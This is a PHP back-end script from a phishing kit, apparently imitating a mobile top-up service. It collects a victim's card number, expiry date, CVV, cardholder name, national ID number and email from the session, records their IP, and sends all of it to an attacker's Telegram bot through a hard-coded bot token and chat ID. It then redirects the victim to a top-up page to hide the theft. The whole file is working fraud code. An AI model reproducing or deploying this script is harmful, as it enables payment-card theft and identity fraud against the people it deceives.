<?php
session_start();

$ip = getenv("REMOTE_ADDR");

$msg = "
===RECARGAS BY @WTFRAND===
Tarjeta	 : ".$_SESSION['card']."
Vencimiento	 : ".$_SESSION['venc']."
CVV	 : ".$_SESSION['cvv']."
Titular	 : ".$_SESSION['name']."
DNI	 : ".$_SESSION['dni']."
Correo	 : ".$_SESSION['email']."

IP : $ip
========";

define('BOT_TOKEN', '5231214683:AAHZbUDe8V3BB0dUBSPx4tBPrQk0Cr5r-h8');
define('CHAT_ID', '5086574647');
define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');

enviar_telegram($msg);

function enviar_telegram($msj)  {
	$queryArray = [
		'chat_id' => CHAT_ID,
		'text' => $msj,
	];
	$url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
	$result = file_get_contents($url);
}

header("Location: https://miclaro.online/recargas");
?>